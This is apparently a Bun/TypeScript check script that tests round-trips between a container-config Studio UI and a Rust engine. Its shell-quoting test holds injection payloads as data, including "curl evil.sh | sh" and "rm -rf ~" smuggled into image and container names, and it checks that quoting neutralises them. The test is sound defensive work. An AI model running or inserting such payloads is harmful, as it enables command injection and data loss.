// Studio↔engine parity guard.
//
// Every Studio preset (plus defaults) must generate TOML that the real Rust
// engine accepts, compile to a Quadlet unit, and survive an import loop —
// because the TOML now comes from the same Rust serializer the CLI writes
// through, the remaining drift the check catches is in the state translation:
// configShape.ts building a wired Config, parseImport.ts reading one back,
// and the schema data wiring (defaults, enum variants, labels).
//
// Run: bun scripts/check-studio-parity.ts
// (requires website/src/wasm built via ../scripts/build-wasm.sh)
import { parse as parseTomlText } from "smol-toml";
import { validate_toml, compile_quadlet } from "../src/wasm/podbox_wasm";
import {
  ensureEngine,
  engineSchema,
  configToToml,
} from "../src/design/islands/studio/engine";
import { tomlToPatch } from "../src/design/islands/studio/parseImport";
import { presetPatch } from "../src/design/islands/studio/presets";
import {
  CUSTOM_SCHEMA_PATHS,
  ENUM_LABELS,
  FIELDS,
  initialStudioValues,
} from "../src/design/islands/studio/schema";
import { stateToConfig } from "../src/design/islands/studio/configShape";
import { studioReducer } from "../src/design/islands/studio/reducer";
import { cliCommand, quickStartCommand, shellQuote } from "../src/design/islands/studio/quickStart";
import type { StudioValues } from "../src/design/islands/studio/useStudioState";

await ensureEngine();

// Defaults live in the schema module (same object the UI boots from), and
// every patch goes through the real UI reducer — the exact path presets,
// Reset, import and share links take — so a key the reducer drops fails
// here instead of silently losing user data.
const defaults: StudioValues = { ...initialStudioValues() };

const fail = (msg: string): never => {
  console.error(msg);
  process.exit(1);
};

const cases: Array<[string, Partial<StudioValues>]> = [
  ["defaults", {}],
  ["rust", presetPatch("rust")],
  ["arch-gui", presetPatch("arch-gui")],
  ["fullstack", presetPatch("fullstack")],
  ["gaming", presetPatch("gaming")],
  ["minimal", presetPatch("minimal")],
  // New panels: dotfiles + caches + services + slice/weight + offline.
  [
    "integrations",
    {
      dotfilesSource: "host:~/.dotfiles",
      dotfilesTarget: "~/.dotfiles",
      dotfilesCloneOn: "container",
      dotfilesInstall: "./install.sh",
      sharedCaches: ["cargo", "npm"],
      hostCaches: ["pip"],
      services: [
        { name: "redis", command: "redis-server", restart: "on-failure" },
        { name: "worker", command: "npm run worker", restart: "always" },
      ],
      containerSlice: "podbox.slice",
      containerCpuWeight: 500,
      netOffline: true,
      intGitIdentity: false,
      lifeAutoCheckpoint: true,
      // USB passthrough was missing from Studio while the engine and doctor
      // already supported it.
      hwUsb: true,
    },
  ],
  ["x11", { intWayland: true, intX11: true }],
  // [[provision]]: array-of-tables, defaults omitted, abort + root + env
  // emitted only when they differ from the engine default.
  [
    "provision",
    {
      provisionSteps: [
        {
          name: "rust-toolchain",
          run: "mise use -g rust@stable",
          timeout: "5m",
          onFailure: "warn",
          envList: [],
          root: false,
        },
        {
          name: "git-defaults",
          run: 'git config --global init.defaultBranch main',
          timeout: "10m",
          onFailure: "abort",
          envList: [{ key: "FOO", value: "bar" }],
          root: true,
        },
        {
          name: "multi-line",
          run: "set -e\nmise use -g rust@stable\necho done",
          timeout: "5m",
          onFailure: "warn",
          envList: [],
          root: false,
        },
      ],
    },
  ],
  // [integration.host_exec]: the per-entry timeout rides the detailed
  // allowlist table form (only when set), and a guest-cwd policy that
  // differs from the engine default gets written.
  [
    "host-exec",
    {
      hostExecEnabled: true,
      hostExecList: [
        { alias: "git", path: "/usr/bin/git", timeout: undefined },
        { alias: "compile", path: "/usr/local/bin/compile", timeout: 300 },
      ],
      hostExecCwd: "map",
    },
  ],
];

let failed = 0;
for (const [name, patch] of cases) {
  const values = studioReducer(defaults, { type: "patch", patch });
  // Studio state -> Config JSON -> canonical TOML, all in wasm.
  const toml = configToToml(stateToConfig(values));
  if (toml == null) {
    console.error(`✗ ${name}: stateToConfig did not build a wired podbox Config (see log)`);
    failed++;
    continue;
  }
  const v = validate_toml(toml) as {
    valid: boolean;
    errors: Array<{ field?: string; message: string }>;
    warnings: string[];
  };
  if (!v.valid) {
    console.error(
      `✗ ${name}: TOML rejected by Rust engine:\n  ${v.errors.map((e) => (e.field ? `${e.field}: ${e.message}` : e.message)).join("\n  ")}`,
    );
    failed++;
    continue;
  }
  let compiled: { container: string; containerfile: string | null; warnings: string[]; x11_service?: string | null };
  try {
    compiled = compile_quadlet(toml) as { container: string; containerfile: string | null; warnings: string[] };
  } catch (e) {
    console.error(`✗ ${name}: compile threw: ${e}`);
    failed++;
    continue;
  }
  if (!compiled.container.includes(`Description=podbox -- ${values.containerName}`)) {
    console.error(`✗ ${name}: compiled unit missing container section`);
    failed++;
    continue;
  }
  if (name === "x11") {
    if (!compiled.container.includes("Wants=dev-x11.service") || !compiled.container.includes("Environment=DISPLAY=:0")) {
      console.error(`✗ ${name}: container is missing X11 wiring`);
      failed++;
      continue;
    }
    if (!compiled.x11_service?.includes("ExecStart=/usr/bin/xwayland-satellite :0")) {
      console.error(`✗ ${name}: compiled X11 service is missing`);
      failed++;
      continue;
    }
  }
  // Every config yields a Containerfile. A custom base renders the full
  // recipe with the guest layer marked as a placeholder (wasm embeds no
  // guest binary) plus a warning; prebuilt images get the short overlay.
  const cf = compiled.containerfile as string | undefined;
  if (!cf || !cf.startsWith('FROM ')) {
    console.error(`✗ ${name}: expected a Containerfile starting with FROM`);
    failed++;
    continue;
  }
  const guestMarked = cf.includes('podbox-guest: not embedded in this build');
  const guestCopied = cf.includes('COPY podbox-guest');
  const prebuilt = values.imagePrebuiltRef !== '';
  if (prebuilt) {
    if (guestCopied) {
      console.error(`✗ ${name}: prebuilt overlay must not COPY the guest`);
      failed++;
      continue;
    }
  } else if (!guestMarked || guestCopied) {
    console.error(`✗ ${name}: custom base must mark the guest layer instead of copying it`);
    failed++;
    continue;
  }
  // The placeholder describes the preview environment, so it belongs in the
  // rendered text and must never reach the user as a config warning.
  if (compiled.warnings.some((w) => w.toLowerCase().includes('guest'))) {
    console.error(`✗ ${name}: guest placeholder must not be reported as a warning`);
    failed++;
    continue;
  }
  // Import loop: generated TOML -> state patch -> regenerated TOML must
  // still validate AND be a fixed point (guards parseImport.ts and
  // configShape.ts against schema drift too).
  const reimported = studioReducer(values, {
    type: "patch",
    patch: tomlToPatch(parseTomlText(toml) as Record<string, any>) as Record<string, unknown>,
  });
  const toml2 = configToToml(stateToConfig(reimported));
  if (toml2 == null) {
    console.error(`✗ ${name}: imported state did not rebuild a wired Config`);
    failed++;
    continue;
  }
  const v2 = validate_toml(toml2) as {
    valid: boolean;
    errors: Array<{ field?: string; message: string }>;
  };
  if (!v2.valid) {
    console.error(
      `✗ ${name}: re-imported TOML rejected:\n  ${v2.errors.map((e) => (e.field ? `${e.field}: ${e.message}` : e.message)).join("\n  ")}`,
    );
    failed++;
    continue;
  }
  if (toml2 !== toml) {
    console.error(`✗ ${name}: emission is not a fixed point of import\nbefore:\n${toml}\nafter:\n${toml2}`);
    failed++;
    continue;
  }
  console.log(`✓ ${name}: valid TOML, compiled ${compiled.container.split("\n").length} lines`);
}

if (failed > 0) {
  console.error(`\n${failed} case(s) failed — Studio and podbox schema have drifted.`);
  process.exit(1);
}

// ── schema data drift ─────────────────────────────────────────────────────
// The Rust side serves two tables; the Studio must know where every path
// lands, and every enum option must carry a UI label.

{
  const engineData = engineSchema();
  const { defaults: engineDefaults, enums: engineEnums } = engineData;
  const fieldsPaths = new Set<string>(FIELDS.map((f) => f.tomlPath));
  const customDefaults: readonly string[] = CUSTOM_SCHEMA_PATHS.defaults;
  const unknownDefaults = Object.keys(engineDefaults).filter(
    (p) => !fieldsPaths.has(p) && !customDefaults.includes(p),
  );
  if (unknownDefaults.length > 0) {
    fail(
      `schema-defaults: engine serves defaults the Studio does not wire: ${unknownDefaults.join(", ")}\n` +
      `  Known custom-shaped paths: ${[...customDefaults].join(", ")} — extend configShape.ts and the wiring, not a label.`,
    );
  }
  console.log(
    `✓ schema-defaults: all ${Object.keys(engineDefaults).length} engine defaults land in the Studio wiring`,
  );

  const customEnums: readonly string[] = CUSTOM_SCHEMA_PATHS.enums;
  const unknownEnums = Object.keys(engineEnums).filter(
    (p) => !fieldsPaths.has(p) && !customEnums.includes(p),
  );
  if (unknownEnums.length > 0) {
    fail(`schema-enums: engine serves enum(s) the Studio does not wire: ${unknownEnums.join(", ")}`);
  }
  // Every select-kind field must be backed by a served variant list — the
  // Studio only shows what the engine accepts, never its own copy.
  const selectFields = FIELDS.filter((f) => f.kind === "select");
  const uncovered = selectFields.filter((f) => !Array.isArray(engineEnums[f.tomlPath]));
  if (uncovered.length > 0) {
    fail(
      `schema-enums: select field(s) without served variants: ${uncovered.map((f) => f.tomlPath).join(", ")}\n` +
      `  Serve them from schema_enums() in the config crate.`,
    );
  }
  // Every variant must have UI metadata in the Studio's label tables; a new
  // Rust variant fails here until it has a label instead of rendering raw.
  const unlabeled: string[] = [];
  for (const [path, variants] of Object.entries(engineEnums) as [string, string[]][]) {
    const labels = ENUM_LABELS[path];
    if (!labels) {
      unlabeled.push(`${path} (no label table)`);
      continue;
    }
    for (const variant of variants) {
      if (!labels[variant]) unlabeled.push(`${path}.${variant}`);
    }
  }
  if (unlabeled.length > 0) {
    fail(`schema-enums: missing UI labels: ${unlabeled.join(", ")} — add them to ENUM_LABELS`);
  }
  console.log(
    `✓ schema-enums: ${Object.keys(engineEnums).length} served lists cover all ${selectFields.length} select fields, all labeled`,
  );
}
console.log("\nAll Studio presets round-trip through the Rust engine.");

// Structured errors carry field targets for input highlighting.
{
  const bad = { ...defaults, containerMemory: "bogus" };
  const toml = configToToml(stateToConfig(bad)) ?? "";
  const v = validate_toml(toml) as {
    valid: boolean;
    errors: Array<{ field?: string; message: string }>;
  };
  const memErr = v.errors.find((e) => e.field === "container.memory");
  if (v.valid || !memErr) {
    console.error("✗ field-errors: expected a container.memory-targeted issue");
    process.exit(1);
  }
  console.log(`✓ field-errors: container.memory -> "${memErr.message}"`);
}
// Prebuilt-image configs take the overlay path, which the wasm build CAN
// render (no guest binary needed).
{
  const values = { ...defaults, imagePrebuiltRef: "ghcr.io/bethropolis/podbox:cachy-latest" };
  const toml = configToToml(stateToConfig(values)) ?? "";
  const compiled = compile_quadlet(toml) as { containerfile: string | null };
  if (!compiled.containerfile?.includes("FROM")) {
    console.error("✗ prebuilt: expected a Containerfile overlay");
    process.exit(1);
  }
  console.log(`✓ prebuilt: Containerfile overlay rendered (${compiled.containerfile.split("\n").length} lines)`);
}
// Unknown dbus presets are parse errors that name every valid option.
{
  const toml =
    '[container]\nname = "x"\nhome = "/tmp/x"\n[image]\nimage = "cachyos:latest"\n[integration]\ndbus = true\n[dbus]\npreset = "gnoem"\n';
  const v = validate_toml(toml) as {
    valid: boolean;
    errors: Array<{ field?: string; message: string }>;
  };
  const presetErr = v.errors.find((e) => e.message.includes("dbus.preset"));
  const namesAll = ["flatpak", "gnome", "kde", "portal", "none"].every((o) =>
    presetErr?.message.includes(o),
  );
  if (v.valid || !presetErr || !namesAll) {
    console.error('✗ dbus-preset: expected a dbus.preset issue naming all options');
    process.exit(1);
  }
  console.log(`✓ dbus-preset: dbus.preset rejected, all options named`);
}
// host-exec cwd policy + per-entry timeout: the engine serves the default
// (`home`) and the variant list, the Studio only writes the key when it
// differs, and a timeout rides the detailed allowlist table form.
{
  const engineData = engineSchema();
  const served = engineData.enums["integration.host_exec.cwd"];
  if (!Array.isArray(served) || !["map", "home", "refuse"].every((v) => served.includes(v))) {
    console.error(`✗ host-exec-cwd: engine schema does not serve the cwd variant list: ${JSON.stringify(served)}`);
    process.exit(1);
  }
  if (engineData.defaults["integration.host_exec.cwd"] !== "home") {
    console.error(`✗ host-exec-cwd: engine default is not "home": ${JSON.stringify(engineData.defaults["integration.host_exec.cwd"])}`);
    process.exit(1);
  }
  const values = studioReducer(defaults, {
    type: "patch",
    patch: {
      hostExecEnabled: true,
      hostExecList: [
        { alias: "git", path: "/usr/bin/git", timeout: undefined },
        { alias: "compile", path: "/usr/local/bin/compile", timeout: 300 },
      ],
      hostExecCwd: "map",
    },
  });
  const toml = configToToml(stateToConfig(values)) ?? "";
  if (!toml.includes("cwd = \"map\"")) {
    console.error(`✗ host-exec-cwd: map policy not emitted:\n${toml}`);
    process.exit(1);
  }
  if (!toml.includes("timeout = 300") || toml.includes("timeout = 0")) {
    console.error(`✗ host-exec-timeout: per-entry timeout not emitted:\n${toml}`);
    process.exit(1);
  }
  // The engine default stays out of the TOML, matching the serde rule.
  const plain = configToToml(
    stateToConfig(
      studioReducer(defaults, {
        type: "patch",
        patch: {
          hostExecEnabled: true,
          hostExecList: [{ alias: "git", path: "/usr/bin/git", timeout: undefined }],
        },
      }),
    ),
  ) ?? "";
  if (plain.includes("cwd =")) {
    console.error(`✗ host-exec-cwd: default policy leaked into the TOML:\n${plain}`);
    process.exit(1);
  }
  if (plain.includes("timeout =")) {
    console.error(`✗ host-exec-timeout: unset timeout leaked into the TOML:\n${plain}`);
    process.exit(1);
  }
  console.log("✓ host-exec-cwd: map/refuse emitted, default kept out of the TOML");
  console.log("✓ host-exec-timeout: detailed entry written only once a timeout is set");
}
// xdg_open table form: a custom scheme allowlist must survive emission and
// import in Studio-land, and stay a fixed point.
{
  const values = studioReducer(defaults, {
    type: "patch",
    patch: { intXdgOpen: true, intXdgOpenSchemes: ["http", "smb"] },
  });
  const toml = configToToml(stateToConfig(values)) ?? "";
  if (
    !toml.includes("[integration.xdg_open]\nenabled = true\nallowed_schemes = [") ||
    !toml.includes('"http"') ||
    !toml.includes('"smb"')
  ) {
    console.error(`✗ xdg-open-schemes: table form not emitted:\n${toml}`);
    process.exit(1);
  }
  if (toml.includes("xdg_open = true")) {
    console.error("✗ xdg-open-schemes: bool shorthand conflicts with the table line");
    process.exit(1);
  }
  // The default allowlist stays in the bool shorthand.
  const plain = configToToml(
    stateToConfig(studioReducer(defaults, { type: "patch", patch: { intXdgOpen: true } })),
  ) ?? "";
  if (!plain.includes("xdg_open = true")) {
    console.error("✗ xdg-open-schemes: default allowlist must stay the bool shorthand");
    process.exit(1);
  }
  // Importing the emitted shape must land back in exactly the same state.
  const reimported = studioReducer(values, {
    type: "patch",
    patch: tomlToPatch(parseTomlText(toml) as Record<string, any>) as Record<string, unknown>,
  });
  // `intXdgOpen` stays; import must not reset the engine-implied enabling.
  if (reimported.intXdgOpen !== true || JSON.stringify(reimported.intXdgOpenSchemes) !== JSON.stringify(["http", "smb"])) {
    console.error(`✗ xdg-open-schemes: import lost state: ${JSON.stringify({ intXdgOpen: reimported.intXdgOpen, intXdgOpenSchemes: reimported.intXdgOpenSchemes })}`);
    process.exit(1);
  }
  const toml2 = configToToml(stateToConfig(reimported)) ?? "";
  if (toml2 !== toml) {
    console.error(`✗ xdg-open-schemes: emission is not a fixed point of import\nbefore:\n${toml}\nafter:\n${toml2}`);
    process.exit(1);
  }
  console.log("✓ xdg-open-schemes: table form accepted by the Rust engine");
}

// Shell injection guard: hostile values riding in on share links must land
// as single argv words when the Quick Start blocks actually run under sh.
{
  const eq = (a: unknown, b: unknown) => JSON.stringify(a) === JSON.stringify(b);
  // Quoter unit rules: safe words stay bare, the rest is single-quoted.
  const quoteCases: Array<[string, "sh" | "fish", string]> = [
    ["dev", "sh", "dev"],
    ["ghcr.io/org/img:latest", "sh", "ghcr.io/org/img:latest"],
    ["", "sh", "''"],
    ["a;b", "sh", "'a;b'"],
    ["a'b", "sh", "'a'\\''b'"],
    ["$(touch pwned)", "sh", "'$(touch pwned)'"],
    ["`touch pwned`", "sh", "'`touch pwned`'"],
    ["a'b", "fish", "'a\\'b'"],
    ["a\\b", "fish", "'a\\\\b'"],
  ];
  for (const [input, shell, want] of quoteCases) {
    const got = shellQuote(input, shell);
    if (got !== want) {
      console.error(`✗ shell-quote: shellQuote(${JSON.stringify(input)}, ${shell}) = ${JSON.stringify(got)}, want ${JSON.stringify(want)}`);
      process.exit(1);
    }
  }
  // fish quoting inverts: unescape back to the input.
  const fishUnquote = (q: string): string => {
    if (!q.startsWith("'") || !q.endsWith("'")) throw new Error("not quoted");
    const body = q.slice(1, -1);
    let result = "";
    for (let index = 0; index < body.length; index += 1) {
      const character = body[index];
      if (character === "\\" && (body[index + 1] === "\\" || body[index + 1] === "'")) {
        result += body[index + 1];
        index += 1;
      } else {
        result += character;
      }
    }
    return result;
  };
  const fishEvil = "x'; curl evil.sh | sh; echo '";
  if (fishUnquote(shellQuote(fishEvil, "fish")) !== fishEvil) {
    console.error("✗ shell-quote: fish quoting does not round-trip");
    process.exit(1);
  }
  // The common case reads exactly as before (no added quotes).
  if (cliCommand({ containerName: "dev", imagePrebuiltRef: "" }) !== "podbox create dev --edit") {
    console.error("✗ shell-quote: plain quick command changed shape");
    process.exit(1);
  }
  // End to end: run the generated blocks under sh with a stub `podbox`
  // that records its argv, and check the attacker string arrives intact
  // as one word instead of executing.
  const { mkdtempSync, mkdirSync, writeFileSync, readFileSync } = await import("node:fs");
  const { tmpdir } = await import("node:os");
  const { join } = await import("node:path");
  const tmp = mkdtempSync(join(tmpdir(), "studio-quote-"));
  const bin = join(tmp, "bin");
  mkdirSync(bin);
  const capture = join(tmp, "argv");
  writeFileSync(join(bin, "podbox"), `#!/bin/sh\nprintf '%s\\0' "$@" > "${capture}"\n`);
  await Bun.$`chmod +x ${join(bin, "podbox")}`.quiet();
  const evilImage = "x'; curl evil.sh | sh; echo '";
  const evilName = "dev; rm -rf ~";
  const runEnv = { ...process.env, HOME: tmp, PATH: `${bin}:${process.env.PATH}` };
  const runSh = async (script: string) => {
    try {
      await Bun.$`sh -c ${script}`.env(runEnv).quiet();
    } catch {
      // The stub always exits 0; a failure here is a quoting break.
      console.error(`✗ shell-quote: generated block failed under sh:\n${script}`);
      process.exit(1);
    }
  };
  const readArgv = (): string[] => {
    const raw = readFileSync(capture);
    return raw.toString().split("\0").slice(0, -1);
  };
  await runSh(cliCommand({ containerName: "dev", imagePrebuiltRef: evilImage }));
  if (!eq(readArgv(), ["create", evilImage, "--name", "dev", "--edit"])) {
    console.error(`✗ shell-quote: cliCommand argv escaped its word: ${JSON.stringify(readArgv())}`);
    process.exit(1);
  }
  const body = '[container]\nname = "dev"\n';
  await runSh(quickStartCommand({ containerName: evilName, imagePrebuiltRef: "" }, body, "sh"));
  if (!eq(readArgv(), ["create", evilName])) {
    console.error("✗ shell-quote: quick-start argv escaped its word");
    process.exit(1);
  }
  const written = readFileSync(join(tmp, ".config", "podbox", "profiles", "devrm-rf.toml"), "utf8");
  if (written !== body) {
    console.error("✗ shell-quote: quick-start wrote the TOML to the wrong path or content");
    process.exit(1);
  }
  // The payload must not have executed: no stray files, no extra argv.
  const { readdirSync } = await import("node:fs");
  if (readdirSync(tmp).some((f) => f === "pwned" || f.startsWith("evil"))) {
    console.error("✗ shell-quote: payload executed during the sh run");
    process.exit(1);
  }
  console.log("✓ shell-quote: hostile image/name stay single argv words under sh");
}

// Every key in the schema defaults must survive a patch through the
// reducer: this is the guard that catches a repeat of the 19
// silently-dropped fields (presets, Reset, import, share links and session
// restore all funnel through `applyPatch`).
{
  const keys = Object.keys(initialStudioValues());
  const failedKeys: string[] = [];
  for (const key of keys) {
    const sentinel = { __sentinel: key };
    const next = studioReducer(defaults, {
      type: "patch",
      patch: { [key]: sentinel },
    }) as unknown as Record<string, unknown>;
    if (next[key] !== sentinel) failedKeys.push(key);
  }
  // Unknown keys are ignored, not stored.
  const withUnknown = studioReducer(defaults, {
    type: "patch",
    patch: { __no_such_key: 1 },
  }) as unknown as Record<string, unknown>;
  if (failedKeys.length > 0) {
    console.error(`✗ reducer-keys: patch dropped ${failedKeys.length} key(s): ${failedKeys.join(", ")}`);
    process.exit(1);
  }
  if ("__no_such_key" in withUnknown) {
    console.error("✗ reducer-keys: unknown patch key was stored");
    process.exit(1);
  }
  console.log(`✓ reducer-keys: all ${keys.length} defaults survive applyPatch`);
}
